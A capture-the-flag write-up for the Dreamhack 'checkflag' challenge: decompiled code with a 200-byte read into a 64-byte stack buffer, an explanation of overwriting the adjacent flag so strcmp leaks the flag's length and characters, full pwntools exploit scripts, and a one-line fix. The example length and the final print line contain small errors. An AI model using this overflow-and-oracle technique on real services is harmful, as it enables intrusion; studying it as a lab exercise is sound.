---
title: "[Dreamhack] checkflag - Write up"
date: 2024-01-12 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, stack-overflow, strcmp, dreamhack]
author: datious
---
[Write up for dreamhack]__Challenge: checkflag | Author: datious

checkflag.c
```
undefined8 main(void)

{
  char cVar1;
  int cmp;
  FILE *fp;
  ssize_t sVar2;
  long lVar3;
  ulong uVar4;
  char *pcVar5;
  long in_FS_OFFSET;
  byte bVar6;
  char input [64];
  char flag [136];
  long local_20;
  
  bVar6 = 0;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  pcVar5 = input;
  for (lVar3 = 0x32; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)pcVar5 = 0;
    pcVar5 = (char *)((long)pcVar5 + 4);
  }
  fp = fopen("flag","r");
  if (fp != (FILE *)0x0) {
    fgets(flag,0x40,fp);
    fclose(fp);
    fputs("What\'s the flag? ",stdout);
    fflush(stdout);
    sVar2 = read(0,input,200);
    fp = stdout;
    uVar4 = 0xffffffffffffffff;
    pcVar5 = flag;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
    } while (cVar1 != '\0');
    if ((long)(~uVar4 - 1) <= sVar2) {
      cmp = strcmp(input,flag);
      if (cmp == 0) {
        fputs("Correct!\n",fp);
        if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        return 0;
      }
    }
    fputs("Failed!\n",fp);
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}

```

The vulnerability is a buffer overflow.
The program allows entering up to 200 bytes into the **input** buffer, which is only allocated 64 bytes. This enables us to overwrite the adjacent stack memory, where the **flag** variable resides.
1. Analyzing and gathering
- Check security layers:
![image](https://hackmd.io/_uploads/H1ISbOZ8fx.png)

- I used GDB to inspect the stack layout upon user input.
 ![image](https://hackmd.io/_uploads/HJrhbubLzg.png)
- As shown above, the flag is located directly below input on the stack.
- Back to the main function: the program just returns **correct!** when **strcmp(input,flag)** returns 0 => Both of the strings have to equal.
- Analyzing strcmp() function:
```
int mystrcmp(const char *s1, const char *s2)
{
    while (*s1 == *s2)
    {
        if (*s1 == '\0')
            return 0;

        s1++;
        s2++;
    }

    return (unsigned char)*s1 - (unsigned char)*s2;
}
```
- The **strcmp()** function compares bytes sequentially until it reachs a null byte (\x00).
- Based on this, here is my exploitation strategy.
    + The first, we leak flag's length. By gradually increasing the length of 'X', we can determine the length of the flag.
    >     input: XXX\x00\x00....
    >     flag:  XXXABCD}\x00... => return failed!
    >     input: XXXXXXXX\x00\x00...
    >     flag:  XXXXXXXX\x00\x00.. => return correct! the length of the 'x' string is the length of the flag. 

    + The second, given the length and the hint that ***The flag matches DH{...} with printable ASCII characters (0x20-0x7e)"***. We have sufficient information to brute-force the flag character by character.

2. Exploiting
- Determine the flag length:
    


```
#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
exe=ELF('./checkflag',checksec=False)
#p=process(exe.path)

#finding length of the flag
flag_size=0
for i in range(0,0x40):
    p=process(exe.path)
    payload=b'A'*i
    payload+=b'\x00'*(0x40-i)
    payload+=b'A'*i
    p.sendafter(b'flag? ',payload)
    result=p.recvline()
    if b'Correct!' in result:
        print(f'[+] The length of the flag: {i}')
        flag_size=i
        p.close()
        break
    p.close()
```
- Bruteforces:
>     Example the length of the flag is 9 (flag:DH{ABCDEF})
>     0-input: XXXXXXX[guess]}\x00\x00.. the guess is the char from 0x20 to 0x7e
>     0-flag:  XXXXXXXF}\x00\x00 => if guess=='F' => return correct! add to the flag! flag='F'
>     1-input: XXXXXX[guess]F}\x00\x00...
>     1-flag:  XXXXXXEF}\x00\x00.. => if guess=='E' => return correct! add to the flag! flag='EF'....



=> DH{flag} => DH{ABCDEF}

3. Script
```
#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
exe=ELF('./checkflag',checksec=False)
#p=process(exe.path)

#finding length of the flag
flag_size=0
for i in range(0,0x40):
    p=process(exe.path)
    payload=b'A'*i
    payload+=b'\x00'*(0x40-i)
    payload+=b'A'*i
    p.sendafter(b'flag? ',payload)
    result=p.recvline()
    if b'Correct!' in result:
        print(f'[+] The length of the flag: {i}')
        flag_size=i
        p.close()
        break
    p.close()

#bruteforces flag
context.terminal = ['konsole','-e']

payload_head=b'DH{'
payload_rear=b'}'
main_flag_length=flag_size-4

flag=b''

for i in range(main_flag_length):
    for c in range(0x20,0x7f):
        payload=b'A'*(flag_size-2-i)+chr(c).encode()+flag+payload_rear
        payload+=b'\x00'*(0x40-len(payload))
        payload+=b'A'*(flag_size-2-i)
        p=process(exe.path)
        p.sendafter(b'flag? ',payload)
        re=p.recvline()
        if b'Correct!' in re:
            flag=chr(c).encode()+flag
            p.close()
            break
        p.close()


print(f'found: {"DH{"+flag+"}"}')

```

How to fix this vulnerability
- This vulnerability is caused by reading more data than the destination buffer can hold, resulting in a stack-based buffer overflow.
sVar2 = read(0,input,200); => sVar2 = read(0,input,sizeof(input));

Goodluck!!!